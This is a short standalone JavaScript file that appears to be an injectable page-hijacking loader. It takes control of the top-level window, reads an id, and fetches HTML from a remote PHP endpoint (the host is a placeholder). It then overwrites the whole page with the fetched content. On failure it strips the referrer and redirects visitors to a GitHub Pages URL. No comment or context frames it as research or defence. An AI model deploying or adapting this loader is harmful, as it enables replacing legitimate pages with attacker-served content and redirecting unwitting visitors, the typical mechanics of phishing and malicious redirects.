
(function () {
  var W;

  try {
    W = window.top;
    if (W.__fc_ran) return;
    W.__fc_ran = 1;
  } catch (e) {
    return;
  }

  // GitHub Pages base URL
  var BASE = "https://riopehrips.github.io/con";
  var FAIL = BASE + "/";

  function bail(u) {
    try {
      var m = W.document.createElement("meta");
      m.name = "referrer";
      m.content = "no-referrer";
      W.document.head.appendChild(m);
    } catch (e) {}

    W.location.replace(u);
  }

  function getId() {
    try {
      var s = document.currentScript;

      if (s && s.src) {
        var m = /[?&]id=([^&]+)/i.exec(s.src);
        if (m) return decodeURIComponent(m[1]);
      }
    } catch (e) {}

    var match = /[?&]id=([^&]+)/i.exec(
      W.location.search || ""
    );

    return match ? decodeURIComponent(match[1]) : "";
  }

  var id = getId();

  if (!/^[A-Za-z0-9_.-]{1,80}$/.test(id)) {
    return bail(FAIL);
  }

  var fin = 0;

  var t = setTimeout(function () {
    if (!fin) bail(FAIL);
  }, 15000);

  // PHP endpoint must be hosted separately
  var API = "https://YOUR-PHP-HOST.com/fc/art.php";

  fetch(API + "?id=" + encodeURIComponent(id), {
    mode: "cors",
    credentials: "omit",
    referrerPolicy: "no-referrer",
    cache: "no-store"
  })
    .then(function (r) {
      if (!r.ok) throw new Error("HTTP " + r.status);
      return r.text();
    })
    .then(function (html) {
      fin = 1;
      clearTimeout(t);

      var d = W.document;
      d.open();
      d.write(html);
      d.close();

      W.scrollTo(0, 0);
    })
    .catch(function (e) {
      clearTimeout(t);

      try {
        console.error("[FC Error]:", e);
      } catch (x) {}

      if (!fin) bail(FAIL);
    });
})();
